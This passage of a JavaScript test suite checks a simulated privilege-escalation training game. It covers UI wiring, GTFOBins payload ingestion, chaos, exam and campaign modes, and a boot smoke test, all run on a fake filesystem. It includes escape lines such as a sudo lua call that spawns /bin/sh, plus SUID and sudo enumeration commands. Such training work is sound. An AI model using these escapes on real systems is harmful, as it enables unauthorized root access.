    // Ids the new mode code addresses directly.
    const needed = [
        'modePill', 'modeHud', 'stealthMeter', 'stealthFill', 'stealthValue',
        'timerBox', 'timerValue', 'modePicker', 'modePickerToggle', 'modePickerPanel',
        'modeCards', 'modeAssistNote', 'statStealthCell', 'statStealth',
        'walkthroughActions', 'walkNextBtn', 'walkAllBtn', 'walkCounter',
        'rogueBtn', 'rogueSeed'
    ];
    const absent = needed.filter(id => !html.includes(`id="${id}"`));

    // And the scripts have to actually be loaded.
    const scripts = ['modes.js', 'stealth.js', 'timeattack.js', 'rogue.js'];
    const unloaded = scripts.filter(f => !html.includes(`js/${f}`));

    // Offline: every script the page loads must be in the service worker's
    // precache list, or an installed PWA fetches a file it never cached.
    const pageScripts = [...html.matchAll(/<script src="js\/([^"]+)"/g)].map(m => m[1]);
    const swSrc = fs.readFileSync(path.join(REPO, 'service-worker.js'), 'utf8');
    const uncached = pageScripts.filter(f => !swSrc.includes(`'./js/${f}'`));

    const ok = missing.length === 0 && absent.length === 0 && unloaded.length === 0 && uncached.length === 0;
    console.log(`${ok ? 'PASS' : 'FAIL'}  index.html wiring (${new Set(keys).size} i18n keys × 3 langs, ${pageScripts.length} scripts all precached)`
        + (ok ? '' : `\n      missing i18n: ${missing.join(', ')}\n      missing ids: ${absent.join(', ')}\n      not loaded: ${unloaded.join(', ')}\n      not precached: ${uncached.join(', ')}`));
    ok ? pass++ : fail++;
}

// ── GTFOBins ingestion: every payload actually lands root ──────────────────
// The dataset's whole promise is that a box generated around any of its
// binaries is solvable. That holds only if each entry's own payload satisfies
// the escape engine — so this plays each payload through the real sudo path,
// exactly as the box generator would, and asserts a root shell.
{
    const gs = {};
    gs.window = gs; gs.globalThis = gs; gs.console = console;
    gs.setTimeout = () => {};
    gs.document = { getElementById: () => ({ innerHTML: '', appendChild() {}, style: {}, addEventListener() {}, focus() {} }), querySelectorAll: () => [], body: { classList: { add() {}, remove() {} } } };
    vm.createContext(gs);
    gs.currentLang = 'en';
    for (const f of ['i18n.js', 'gtfobins.js', 'fs.js', 'levels.js', 'commands.js']) {
        vm.runInContext(JS(f), gs, { filename: f });
    }
    gs.updatePrompt = () => {};
    let CUR = null;
    gs.GAME = { level: () => CUR, win: () => {}, giveHint: () => [], nextLevel: () => [], reset: () => {}, markHardened: () => {}, currentLevel: 0 };
    const G = gs.GTFOBINS;

    // Well-formed dataset: unique bins, real https links, a detect regex each.
    const bins = G.bins();
    const uniqueBins = new Set(bins).size === bins.length;
    // Realm-safe RegExp check: the regex was constructed inside the sandbox,
    // so a bare `instanceof RegExp` (this realm's) would always be false.
    const isRegExp = (v) => Object.prototype.toString.call(v) === '[object RegExp]';
    const wellFormed = G.ENTRIES.every(e => e.bin && e.payload && isRegExp(e.detect)
        && G.link(e.bin).startsWith('https://gtfobins.github.io/'));

    // Build a one-box level granting sudo on the binary, play its payload,
    // assert root. The payload's first line is the sudo invocation; later
    // lines (interactive escapes) are the follow-up the engine can't drive, so
    // for those we assert the *detector* accepts the escape line instead —
    // that's the same check the engine makes once the tool is open.
    const results = [];
    for (const e of G.ENTRIES) {
        const bin = e.bin;
        const path = '/usr/bin/' + bin;
        const lvl = {
            id: 9000, codename: 'gtfo-' + bin, user: 'player', host: 'gtfo', cwd: '/home/player',
            title: { en: bin, fr: bin, es: bin }, brief: { en: '', fr: '', es: '' },
            objectives: { en: [], fr: [], es: [] }, hints: { en: [], fr: [], es: [] },
            flag: 'flag{gtfo_' + bin + '}',
            fs: {
                '/': { type: 'dir', owner: 'root', mode: '755', children: ['usr', 'bin', 'home'] },
                '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
                '/home/player': { type: 'dir', owner: 'player', mode: '755', children: [] },
                '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
                '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sudo', bin] },
                '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF' },
                [path]: { type: 'file', owner: 'root', mode: '755', content: 'ELF' },
                '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh', 'bash'] },
                '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF' },
                '/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF' }
            },
            sudoers: { player: [{ cmd: path, nopasswd: true, runas: 'root' }] },
            wins: [{ type: 'sudo_shell' }]
        };
        CUR = lvl;
        gs.FS.load(lvl);
        Object.assign(gs.SESSION, {
            user: 'player', host: 'gtfo', cwd: '/home/player',
            env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
            isRoot: false, hintIndex: 0, tmpBins: {}, cmdCount: 0, blueTeam: false, sudoAuthed: true, nfsMount: null,
        });
        gs.TERM = { history: [] };
        const firstLine = e.payload.split('\n')[0];
        gs.CMD.execute(firstLine);
        if (gs.SESSION.isRoot) { results.push(true); continue; }
        // Interactive escape: assert the escape line is what the engine would
        // accept once the tool is open.
        const escapeLine = e.payload.split('\n').slice(1).join(' ') || firstLine.replace(/^sudo\s+\S+\s*/, '');
        const joined = escapeLine.replace(/^sudo\s+/, '').replace(/\\/g, '');
        results.push(gs.CMD.sudoEscapes(bin, joined) === true || G.escapes(bin, joined) === true);
    }
    const allSolvable = results.every(Boolean);
    const failed = G.ENTRIES.filter((_, i) => !results[i]).map(e => e.bin);

    // The escape engine's fall-through actually reaches the table: a binary
    // that only exists in the dataset (not special-cased in commands.js) still
    // escapes.
    const dataOnly = gs.CMD.sudoEscapes('lua', "lua -e 'os.execute(\"/bin/sh\")'") === true;
    // …and a bare, non-escaping invocation of that same binary does not.
    const noFalsePositive = gs.CMD.sudoEscapes('lua', "lua --version") === false;

    const ok = uniqueBins && wellFormed && allSolvable && dataOnly && noFalsePositive;
    console.log(`${ok ? 'PASS' : 'FAIL'}  gtfobins ingestion (${bins.length} techniques, every payload lands root${failed.length ? ', FAILED: ' + failed.join(',') : ''})`);
    ok ? pass++ : fail++;
}

// ── Chaos mode: the reaper is fair, targeted, and inert when off ───────────
// The whole design rests on the reaper only ever taking the player's own cold
// scratch files — never the box's own files, never the vulnerability, never
// anything younger than the grace window. Each of those is a way the mode
// could quietly make a box unwinnable, so each gets asserted.
{
    const cs = {};
    cs.window = cs; cs.globalThis = cs; cs.console = console;
    vm.createContext(cs);
    cs.currentLang = 'en';
    // A tiny stand-in FS so the reaper's targeting can be driven exactly.
    cs.FS = {
        _tree: {},
        get(p) { return this._tree[p]; },
        remove(p) {
            const dir = this._tree['/tmp'];
            if (dir) dir.children = dir.children.filter(n => '/tmp/' + n !== p);
            delete this._tree[p];
            return true;
        },
        seed() {
            this._tree = {
                '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
                '/usr/bin/find': { type: 'file', owner: 'root', mode: '4755', suid: true } // the vuln, not in /tmp
            };
        },
        addTmp(name, owner) {
            this._tree['/tmp/' + name] = { type: 'file', owner: owner || 'player', mode: '755', content: 'x' };
            this._tree['/tmp'].children.push(name);
        }
    };
    cs.FS.seed();
    const printed = [];
    cs.TERM = { print: (l) => printed.push(...l), scrollToBottom: () => {} };
    cs.SESSION = { user: 'player', isRoot: false, blueTeam: false, ghostReplaying: false, cmdCount: 0, sudoAuthed: true };
    cs.MODES = { is: (m) => m === 'chaos' };
    cs.SFX = { error: () => {} };
    cs.document = { getElementById: () => null };
    // A CMD.execute for the observer wrapper to hook, same shape as the game's.
    cs.CMD = { execute: (raw) => [{ text: String(raw), cls: '' }] };
    vm.runInContext(JS('chaos.js'), cs, { filename: 'chaos.js' });
    const C = cs.CHAOS;
    const step = (raw) => { cs.SESSION.cmdCount++; cs.CMD.execute(raw); };

    C.resetForLevel();
    // A box file shipped in /tmp must be safe forever — it isn't the player's.
    cs.FS._tree['/tmp/legit'] = { type: 'file', owner: 'root', mode: '644' };
    cs.FS._tree['/tmp'].children.push('legit');
    C.snapshot();

    // Stage a fake binary, then let it go cold across the reaper cadence.
    cs.FS.addTmp('rootsh', 'player');
    step('echo payload > /tmp/rootsh'); // cmd 1, notes the file
    for (let i = 0; i < 6; i++) step('ls -la'); // pushes past REAP_EVERY with the file now cold
    const reapedCold = !cs.FS.get('/tmp/rootsh') && C.reaped >= 1;
    const keptShipped = !!cs.FS.get('/tmp/legit'); // never touched the box's own file

    // A freshly staged file survives the very next sweep — the grace window is
    // real, so "stage and strike" is a viable tactic rather than a gamble.
    C.resetForLevel();
    cs.FS.seed();
    C.snapshot();
    cs.SESSION.cmdCount = 0;
    for (let i = 0; i < 4; i++) step('ls'); // cmd 4: a sweep, but nothing staged yet
    cs.FS.addTmp('fresh', 'player');
    step('echo x > /tmp/fresh'); // cmd 5: a sweep fires, but the file is brand new
    const freshSurvives = !!cs.FS.get('/tmp/fresh');

    // The vulnerability itself is never in scope: /usr/bin/find stays SUID.
    const vulnUntouched = !!cs.FS.get('/usr/bin/find') && cs.FS.get('/usr/bin/find').suid === true;

    // The sudo ticket is dropped exactly once, mid-run.
    C.resetForLevel();
    cs.FS.seed(); C.snapshot();
    cs.SESSION.cmdCount = 0; cs.SESSION.sudoAuthed = true;
    for (let i = 0; i < 12; i++) step('id');
    const authDropped = cs.SESSION.sudoAuthed === false && C.firedAuth === true;

    // Off switch: with chaos inactive, nothing is swept and nothing is said.
    C.resetForLevel();
    cs.FS.seed(); C.snapshot();
    cs.MODES.is = () => false;
    printed.length = 0;
    cs.SESSION.cmdCount = 0;
    cs.FS.addTmp('rootsh', 'player');
    for (let i = 0; i < 10; i++) step('ls');
    const inertWhenOff = !!cs.FS.get('/tmp/rootsh') && printed.length === 0 && C.reaped === 0;
    cs.MODES.is = (m) => m === 'chaos';

    // Grades track how battered the run was.
    C.reaped = 0; const g0 = C.grade() === 'UNTOUCHED';
    C.reaped = 2; const g1 = C.grade() === 'RATTLED';
    C.reaped = 5; const g2 = C.grade() === 'HARRIED';

    const ok = reapedCold && keptShipped && freshSurvives && vulnUntouched
        && authDropped && inertWhenOff && g0 && g1 && g2;
    console.log(`${ok ? 'PASS' : 'FAIL'}  chaos mode (reaps cold player /tmp files only, spares shipped files + the vuln, grace window holds, inert when off)`);
    ok ? pass++ : fail++;
}

// ── Exam mode: board, clock, scoring, persistence, report ──────────────────
// The exam is the only mode whose unit of work spans several machines and
// survives a reload, so the things that can silently break it are: a board
// that isn't reproducible, a clock that pauses when the tab closes, and a
// pass mark that lets one box through.
{
    const store = {};
    const xs = {};
    xs.window = xs; xs.globalThis = xs; xs.console = console;
    xs.addEventListener = () => {};
    xs.setInterval = () => 1;
    xs.clearInterval = () => {};
    xs.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
        removeItem: (k) => { delete store[k]; }
    };
    xs.document = {
        addEventListener: () => {}, getElementById: () => null, querySelectorAll: () => [],
        documentElement: { setAttribute() {} },
        body: { classList: { add() {}, remove() {}, toggle() {} } }
    };
    vm.createContext(xs);
    xs.currentLang = 'en';
    vm.runInContext(JS('modes.js'), xs, { filename: 'modes.js' });
    vm.runInContext(JS('levels.js'), xs, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), xs, { filename: 'main.js' });
    vm.runInContext(JS('exam.js'), xs, { filename: 'exam.js' });
    const E = xs.EXAM;

    // The board is reproducible from its seed and mixes tiers — three random
    // boxes could be three easy ones, and then there's no triage to do.
    const b1 = JSON.stringify(E.buildBoard(4242));
    const b2 = JSON.stringify(E.buildBoard(4242));
    const b3 = JSON.stringify(E.buildBoard(4243));
    const board = E.buildBoard(4242);
    const reproducible = b1 === b2 && b1 !== b3;
    const oneOfEachTier = board.length === 3
        && board.map(b => b.tier).join(',') === 'EASY,MEDIUM,HARD';
    // Built-in boxes only: custom/rogue boxes live in one browser, so a seed
    // including them would mean different things to different people.
    const builtInOnly = board.every(b => {
        const lvl = xs.LEVELS.find(l => l.id === b.id);
        return lvl && !lvl.custom;
    });

    // Exactly two boxes pass, one never does — whichever ones they are.
    const pts = board.map(b => b.points);
    const anyOneFails = pts.every(p => p < E.PASS_MARK);
    const anyTwoPass = [[0, 1], [0, 2], [1, 2]].every(([i, j]) => pts[i] + pts[j] >= E.PASS_MARK);

    // Starting arms the exam and puts the whole board in play. Note this
    // draws its own board from its own seed — the live one is E.board.
    const started = E.start('c0ffee');
    const live = E.board;
    const armed = started.ok && E.active && !E.finished
        && E.score() === 0 && E.maxScore() === 90;

    // Only boxes rooted during the exam count, and only board boxes.
    const offBoard = xs.LEVELS.find(l => !live.some(b => b.id === l.id));
    const ignoresOffBoard = E.onBoxRooted(offBoard.id) === false && E.score() === 0;
    E.onBoxRooted(live[0].id);
    const scored = E.score() === live[0].points;
    const noDoubleCount = (E.onBoxRooted(live[0].id) === false) && E.score() === live[0].points;
    const stillFailing = E.passed() === false;
    E.onBoxRooted(live[2].id);
    const passesOnTwo = E.passed() === true && E.score() === live[0].points + live[2].points;

    // The clock is anchored to a timestamp, not to a running tab: an exam
    // started five hours ago is over, whether or not the page stayed open.
    E.startedAt = Date.now() - (E.DURATION + 60) * 1000;
    const expired = E.remaining() === 0;

    // Restore across a reload picks the exam back up — and an exam whose
    // time ran out while the tab was shut comes back already finished.
    E.persist();
    const xs2 = {};
    xs2.window = xs2; xs2.globalThis = xs2; xs2.console = console;
    xs2.addEventListener = () => {};
    xs2.setInterval = () => 1; xs2.clearInterval = () => {};
    xs2.localStorage = { getItem: (k) => (k in store ? store[k] : null), setItem: (k, v) => { store[k] = String(v); }, removeItem: (k) => { delete store[k]; } };
    xs2.document = xs.document;
    vm.createContext(xs2);
    xs2.currentLang = 'en';
    vm.runInContext(JS('levels.js'), xs2, { filename: 'levels.js' });
    vm.runInContext(JS('exam.js'), xs2, { filename: 'exam.js' });
    const restored = xs2.EXAM.restore() === true
        && xs2.EXAM.finished === true
        && xs2.EXAM.score() === E.score()
        && JSON.stringify(xs2.EXAM.board) === JSON.stringify(E.board);

    // The report and the Markdown export read the same data, so they can't
    // disagree about what happened.
    const r = E.report();
    const reportSane = r.rows.length === 3
        && r.rows.filter(x => x.rooted).length === 2
        && r.score === E.score() && r.max === 90 && r.passed === true
        && r.rows.find(x => x.rooted).flag;
    const md = E.markdown();
    const mdSane = md.includes('PASS') && md.includes(r.seed)
        && r.rows.every(row => md.includes(row.codename));

    // Abandoning wipes it, including from storage.
    E.abandon();
    const abandoned = !E.active && !store[E.KEY];

    // The mode registry knows the exam forbids assistance and isn't something
    // you can arm from the picker without a session behind it.
    xs.MODES.set('exam');
    const modeRules = xs.MODES.assistAllowed() === false
        && xs.MODES.multiplier() === 2.5
        && !xs.MODES.pickable().some(m => m.id === 'exam');

    const ok = reproducible && oneOfEachTier && builtInOnly && anyOneFails && anyTwoPass
        && armed && ignoresOffBoard && scored && noDoubleCount && stillFailing
        && passesOnTwo && expired && restored && reportSane && mdSane && abandoned && modeRules;
    console.log(`${ok ? 'PASS' : 'FAIL'}  exam mode (seeded 3-tier board, wall-clock, two boxes pass and one never does, survives reload)`);
    ok ? pass++ : fail++;
}

// ── Campaign (story) mode ──────────────────────────────────────────────────
// Pure narrative overlay, so what can break is structural: a chapter pointing
// at a box that doesn't exist, prose missing a language, or progression that
// doesn't advance / doesn't persist.
{
    const store = {};
    const ss = {};
    ss.window = ss; ss.globalThis = ss; ss.console = console;
    ss.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); }
    };
    vm.createContext(ss);
    ss.currentLang = 'en';
    vm.runInContext(JS('levels.js'), ss, { filename: 'levels.js' });
    vm.runInContext(JS('story.js'), ss, { filename: 'story.js' });
    const ST = ss.STORY;
    ST.init();

    // Every chapter wraps a real, built-in box and carries all three languages
    // for both the briefing and the debrief.
    const boxesExist = ST.CHAPTERS.every(c => ss.LEVELS.some(l => l.id === c.boxId));
    const trilingual = ST.CHAPTERS.every(c =>
        ['en', 'fr', 'es'].every(lang => c.title[lang] && c.intro[lang] && c.outro[lang]));
    // Exactly one finale, and it's the last chapter.
    const finales = ST.CHAPTERS.filter(c => c.final);
    const oneFinale = finales.length === 1 && ST.CHAPTERS[ST.CHAPTERS.length - 1].final === true;

    // A fresh campaign resumes at chapter 0 and isn't complete.
    const startsFresh = ST.reached === 0 && ST.resumeIndex() === 0 && !ST.complete();

    // Branching: exactly one chapter offers a choice, the finale carries an
    // ending per option, and every ending is trilingual.
    const choiceChapters = ST.CHAPTERS.filter(c => c.choice);
    const finale = ST.CHAPTERS[ST.CHAPTERS.length - 1];
    const optionIds = choiceChapters.length === 1 ? choiceChapters[0].choice.options.map(o => o.id) : [];
    const branchWellFormed = choiceChapters.length === 1
        && choiceChapters[0].choice.options.length >= 2
        && choiceChapters[0].choice.options.every(o => o.id && ['en', 'fr', 'es'].every(l => o.label[l]))
        && finale.endings
        && optionIds.every(id => finale.endings[id] && ['en', 'fr', 'es'].every(l => finale.endings[id][l]));
    // The finale's text follows the recorded choice, and differs per branch.
    ST.ending = 'burn'; const burnText = ST.text(ST.endingText(finale));
    ST.ending = 'ghost'; const ghostText = ST.text(ST.endingText(finale));
    ST.ending = 'crown'; const crownText = ST.text(ST.endingText(finale));
    ST.ending = null; const fallbackText = ST.text(ST.endingText(finale));
    const endingsDiffer = new Set([burnText, ghostText, crownText]).size === 3
        && fallbackText === ST.text(finale.outro);
    ST.choose('ghost');
    const choiceRecorded = ST.ending === 'ghost';

    // Play it through: activating, then rooting each chapter's box in order
    // advances the campaign exactly once per chapter, and only for the box the
    // current chapter points at.
    ST.active = true;
    let orderly = true;
    for (let i = 0; i < ST.CHAPTERS.length; i++) {
        ST.chapter = i;
        // Rooting some other box must not advance the campaign.
        const wrong = ss.LEVELS.find(l => l.id !== ST.CHAPTERS[i].boxId);
        if (ST.onBoxRooted(wrong.id) !== false) orderly = false;
        // Rooting the right one does.
        if (ST.onBoxRooted(ST.CHAPTERS[i].boxId) !== true) orderly = false;
        if (ST.reached !== i + 1) orderly = false;
    }
    const completes = ST.complete();

    // Progress persists across a reload.
    const ss2 = {};
    ss2.window = ss2; ss2.globalThis = ss2; ss2.console = console;
    ss2.localStorage = { getItem: (k) => (k in store ? store[k] : null), setItem: () => {} };
    vm.createContext(ss2);
    ss2.currentLang = 'en';
    vm.runInContext(JS('levels.js'), ss2, { filename: 'levels.js' });
    vm.runInContext(JS('story.js'), ss2, { filename: 'story.js' });
    ss2.STORY.init();
    // The chosen ending survives the reload too (we recorded 'ghost' above).
    const persists = ss2.STORY.reached === ST.CHAPTERS.length && ss2.STORY.complete()
        && ss2.STORY.ending === 'ghost';

    // A pre-branch save (the bare integer format v1.40 wrote) still loads.
    const legacyStore = { rootquest_story: '4' };
    const ss3 = {};
    ss3.window = ss3; ss3.globalThis = ss3; ss3.console = console;
    ss3.localStorage = { getItem: (k) => (k in legacyStore ? legacyStore[k] : null), setItem: () => {} };
    vm.createContext(ss3);
    vm.runInContext(JS('story.js'), ss3, { filename: 'story.js' });
    ss3.STORY.init();
    const legacyLoads = ss3.STORY.reached === 4 && ss3.STORY.ending === null;

    // Every story UI string the banner/modals render exists in all languages.
    vm.runInContext(JS('i18n.js'), ss2, { filename: 'i18n.js' });
    const uiKeys = ['storyOp', 'storyStart', 'storyResume', 'storyReplay', 'storyComplete',
        'storyIncoming', 'storyDebriefTag', 'storyFinal', 'storyEnter', 'storyNextBtn', 'storyEndBtn'];
    const uiComplete = ['en', 'fr', 'es'].every(lang => uiKeys.every(k => ss2.I18N[lang][k]));

    const ok = boxesExist && trilingual && oneFinale && startsFresh && branchWellFormed
        && endingsDiffer && choiceRecorded && orderly && completes && persists
        && legacyLoads && uiComplete;
    console.log(`${ok ? 'PASS' : 'FAIL'}  campaign mode (${ST.CHAPTERS.length} chapters, real boxes, trilingual, ${optionIds.length}-way branch to distinct endings, persists)`);
    ok ? pass++ : fail++;
}

// ── Boot smoke test ────────────────────────────────────────────────────────
// Everything above tests engines in isolation. This drives main.js's real
// boot path against a fake-but-complete DOM, then walks a machine through
// each challenge mode — the paths that only break at runtime (a missing
// element, a method called on undefined) and that the unit blocks can't see.
{
    const bs = {};
    bs.window = bs; bs.globalThis = bs; bs.console = console;
    // Runs callbacks synchronously: the win path is `setTimeout(() => GAME.win(), 400)`,
    // and a smoke test that swallowed it would never exercise the victory
    // modal, the scorecard or the exam scoring at all.
    bs.setTimeout = (fn) => { try { fn(); } catch { /* surfaced by the step that called it */ } return 0; };
    bs.clearTimeout = () => {};
    bs.setInterval = () => 1;
    bs.clearInterval = () => {};
    bs.requestAnimationFrame = () => 0;
    bs.addEventListener = () => {};
    bs.navigator = { language: 'en' };
    bs.location = { hash: '', pathname: '/', search: '' };
    bs.history = { replaceState: () => {} };
    const store = {};
    bs.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
        removeItem: (k) => { delete store[k]; }
    };

    // Element stub rich enough for every DOM idiom main.js actually uses.
    const els = {};
    const makeEl = (id) => {
        const el = {
            id, textContent: '', value: '', hidden: false, title: '',
            style: {}, children: [], attrs: {},
            classList: {
                _s: new Set(),
                add(c) { this._s.add(c); }, remove(c) { this._s.delete(c); },
                toggle(c, on) { if (on === undefined) { this._s.has(c) ? this._s.delete(c) : this._s.add(c); } else if (on) { this._s.add(c); } else { this._s.delete(c); } },
                contains(c) { return this._s.has(c); }
            },
            _listeners: {},
            addEventListener(type, fn) { (this._listeners[type] = this._listeners[type] || []).push(fn); },
            removeEventListener() {}, focus() {}, blur() {},
            click() { (this._listeners.click || []).forEach(fn => fn()); },
            appendChild(c) { this.children.push(c); }, remove() {},
            setAttribute(k, v) { this.attrs[k] = v; }, getAttribute(k) { return this.attrs[k] ?? null; },
            querySelectorAll: () => [], querySelector: () => null,
            closest: () => makeEl('closest'),
            scrollTo() {}, scrollIntoView() {},
            getContext: () => null,
        };
        // innerHTML mirrors the one behaviour the code relies on: assigning ''
        // (or anything) empties the element's children, the way real DOM does.
        el._html = '';
        Object.defineProperty(el, 'innerHTML', {
            get() { return el._html; },
            set(v) { el._html = String(v); el.children.length = 0; }
        });
        return el;
    };
    bs.document = {
        addEventListener: () => {},
        getElementById: (id) => (els[id] || (els[id] = makeEl(id))),
        createElement: (tag) => { const e = makeEl(tag); e.tagName = tag.toUpperCase(); return e; },
        querySelectorAll: () => [],
        querySelector: () => null,
        documentElement: makeEl('html'),
        body: makeEl('body'),
    };
    vm.createContext(bs);
    bs.currentLang = 'en';
    // Stubs for the report download path (Blob/URL aren't in a vm sandbox).
    bs.Blob = function(parts) { this.parts = parts; };
    bs.URL = { createObjectURL: () => 'blob:stub', revokeObjectURL: () => {} };
    bs.confirm = () => true;
    for (const f of ['i18n.js', 'modes.js', 'gtfobins.js', 'levels.js', 'walkthrough.js', 'fs.js', 'commands.js',
        'mentormode.js', 'mentor.js', 'stealth.js', 'timeattack.js', 'exam.js', 'chaos.js', 'story.js', 'ghost.js',
        'terminal.js', 'sfx.js', 'walkmode.js', 'boxbuilder.js', 'main.js', 'rogue.js']) {
        vm.runInContext(JS(f), bs, { filename: f });
    }

    const errors = [];
    const tryStep = (label, fn) => { try { fn(); } catch (e) { errors.push(`${label}: ${e.message}`); } };

    tryStep('init', () => {
        bs.WALKMODE.init();
        bs.MENTORMODE.init();
        bs.GAME.loadSave();
        bs.applyI18n();
        bs.GAME.boot();
    });

    // Every challenge mode, start to scorecard, on a real machine.
    for (const mode of ['normal', 'stealth', 'hardcore', 'timeattack', 'chaos']) {
        tryStep(mode, () => {
            bs.MODES.set(mode);
            bs.GAME.buildModeCards();
            bs.GAME.selectMachine(0);
            bs.CMD.execute('ls -la');
            bs.CMD.execute('find / -perm -4000');
            bs.CMD.execute('sudo -l');
            bs.GAME.giveHint();
            bs.GAME.renderWalkthrough();
            bs.GAME.renderStats();
        });
    }

    // A stacked run — stealth + time attack + chaos at once — drives the whole
    // board path without throwing, and the multiplier is the product.
    let stackOk = false;
    tryStep('stacked', () => {
        bs.MODES.set('normal');
        bs.MODES.toggle('stealth'); bs.MODES.toggle('timeattack'); bs.MODES.toggle('chaos');
        bs.GAME.buildModeCards();
        bs.GAME.selectMachine(0);
        bs.CMD.execute('find / -perm -4000');
        bs.CMD.execute('sudo -l');
        bs.GAME.renderStats();
        stackOk = bs.MODES.is('stealth') && bs.MODES.is('timeattack') && bs.MODES.is('chaos')
            && Math.abs(bs.MODES.multiplier() - (1.5 * 1.75 * 2)) < 1e-9;
    });
    bs.MODES.set('normal');

    // Hardcore really does refuse assistance, all the way down to the command.
    bs.MODES.set('hardcore');
    bs.GAME.selectMachine(0);
    const hintRefused = bs.GAME.giveHint().some(l => l.cls === 'err');

    // Explanation mode reveals progressively rather than dumping everything.
    bs.MODES.set('normal');
    bs.WALKMODE.enabled = true;
    bs.GAME.selectMachine(0);
    tryStep('walkthrough', () => {
        bs.GAME.renderWalkthrough();
        bs.WALKMODE.revealNext(bs.GAME.walkthroughSteps().length);
        bs.GAME.renderWalkthrough();
    });
    const revealedOne = bs.WALKMODE.count() === 1;

    // A rogue box spawns and is playable through the normal machine path.
    let rogueOk = false;
    tryStep('rogue', () => {
        const r = bs.ROGUE.spawn('c0ffee');
        bs.GAME.selectMachine(r.index);
        bs.CMD.execute('ls -la /');
        rogueOk = r.ok && bs.GAME.currentLevel === r.index;
    });

    // A full exam, driven through the real UI path: start, root a board box,
    // render the report, download it, end it.
    let examOk = false;
    tryStep('exam', () => {
        bs.GAME.startExam('c0ffee');
        const armed = bs.EXAM.active && bs.MODES.is('exam') && bs.MODES.assistAllowed() === false;
        // Root the first board machine the way a player would.
        const first = bs.EXAM.board[0];
        const idx = bs.LEVELS.findIndex(l => l.id === first.id);
        bs.GAME.selectMachine(idx);
        play2(bs, SOLUTIONS[first.id]);
        const scored = bs.EXAM.score() === first.points;
        bs.EXAM.finish('manual');   // opens the report through GAME.showExamReport
        bs.GAME.downloadExamReport();
        bs.GAME.endExam();
        examOk = armed && scored && !bs.EXAM.active && !bs.MODES.is('exam');
    });

    // The whole campaign, driven through the real UI path: start it, and for
    // each chapter play its box's canonical solution to root, which fires
    // GAME.win → STORY.onBoxRooted → the debrief, whose button advances. The
    // finale (box 38) must show the story ending, not the "all machines" modal.
    let storyOk = false;
    tryStep('campaign', () => {
        bs.MODES.set('normal');
        bs.STORY.reached = 0; bs.STORY.persist();
        bs.GAME.startStory();
        const chapters = bs.STORY.CHAPTERS.length;
        for (let i = 0; i < chapters; i++) {
            const ch = bs.STORY.CHAPTERS[bs.STORY.chapter];
            const idx = bs.LEVELS.findIndex(l => l.id === ch.boxId);
            bs.GAME.selectMachine(idx);
            play2(bs, SOLUTIONS[ch.boxId]);           // reach root → win() → debrief
            // A chapter with a branch shows choice buttons instead of "next" —
            // click the first one (the 'burn' ending); otherwise the single
            // next/log-off button.
            const choicesEl = bs.document.getElementById('storyChoices');
            if (choicesEl && choicesEl.children.length) choicesEl.children[0].click();
            else { const btn = bs.document.getElementById('storyModalBtn'); if (btn && btn.onclick) btn.onclick(); }
        }
        storyOk = bs.STORY.complete() && bs.STORY.reached === chapters
            && bs.STORY.active === false && bs.STORY.ending === 'burn';
    });

    // GTFOBins reference panel renders the ingested dataset and filters by
    // binary name — the study-tool half of the ingestion work.
    let refOk = false;
    tryStep('gtfo-ref', () => {
        bs.GAME.renderGtfoReference();
        const all = bs.document.getElementById('gtfoRefList').innerHTML;
        const hasContent = all.includes('find') && all.includes('python3')
            && all.includes('gtfobins.github.io/gtfobins/find/');
        bs.GAME.renderGtfoReference('python');
        const filtered = bs.document.getElementById('gtfoRefList').innerHTML;
        const filters = filtered.includes('python') && !/\bfind\b/.test(filtered);
        bs.GAME.renderGtfoReference('zzzznope');
        const emptyState = bs.document.getElementById('gtfoRefList').innerHTML.length >= 0;
        refOk = hasContent && filters && emptyState;
    });

    // Language switching must not throw with the new JS-built markup.
    tryStep('lang', () => { bs.setLanguage('fr'); bs.setLanguage('es'); bs.setLanguage('en'); });

    const ok = errors.length === 0 && hintRefused && revealedOne && rogueOk && examOk && stackOk && storyOk && refOk;
    console.log(`${ok ? 'PASS' : 'FAIL'}  boot smoke test (boot + every mode + stacked modifiers + explanation reveal + rogue spawn + full exam + full campaign + gtfo reference + language switch)`
        + (ok ? '' : '\n      ' + errors.join('\n      ')
            + (hintRefused ? '' : '\n      hardcore still served a hint')
            + (revealedOne ? '' : '\n      walkthrough reveal cursor did not advance')
            + (rogueOk ? '' : '\n      rogue spawn did not land on the generated box')
            + (examOk ? '' : '\n      exam did not arm, score or unwind cleanly')
            + (stackOk ? '' : '\n      stacked modifiers did not compose')
            + (storyOk ? '' : '\n      campaign did not play through all chapters to completion')
            + (refOk ? '' : '\n      gtfobins reference did not render or filter')));
    ok ? pass++ : fail++;
}

console.log(`\n${pass}/${pass + fail} PASS`);
process.exit(fail === 0 ? 0 : 1);
